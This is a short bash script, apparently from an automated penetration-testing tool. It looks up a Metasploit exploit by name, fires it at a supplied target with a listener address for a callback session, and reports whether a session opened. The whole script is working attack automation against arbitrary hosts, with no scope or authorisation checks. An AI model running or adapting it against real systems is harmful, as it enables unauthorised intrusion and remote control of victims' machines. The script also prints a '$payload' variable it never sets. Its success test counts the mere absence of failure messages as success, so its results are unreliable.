#!/bin/bash

exploit="$1"

res=$(msfconsole -q -x "search $exploit; exit" 2>&1 | grep -v "This copy of metasploit-framework" | grep -v "Consider running")

# Check if there is a valid exploit
if echo "$res" | grep -q "No results from search"; then
    echo "0,$exploit,0, "
else
    exploit=$(echo "$res" | grep -E '^[[:space:]]*0[[:space:]]' | awk '{print $2}')
    exploit=$(echo "$exploit" | sed 's/\x1b\[[0-9;]*m//g')
    target="$2"
    lhost="$3"
    out=$(msfconsole -q 2>&1 <<EOF
use $exploit
set RHOST $target
set LHOST $lhost
exploit
exit
EOF
    )
    if echo "$out" | grep -q "Unknown datastore option: LHOST"; then
	out=$(msfconsole -q 2>&1 <<EOF
use $exploit
set RHOST $target
exploit
exit
EOF
    )
    fi

    if (grep -q "session .* opened" <<< "$out" || (! grep -q "exploit failed" <<< "$out" && ! grep -q "Exploit failed" <<< "$out" && ! grep -q "Exploit completed, but no session was created" <<< "$out" && ! grep -q "No target vulnerable" <<< "$out" && ! grep -q "target may not be vulnerable" <<< "$out" && ! grep -q "Exploit completed, but no session was created." <<< "$out")); then
    	echo "1,$exploit,1,$payload"

    else
	echo "1,$exploit,0,$payload"
    fi
fi
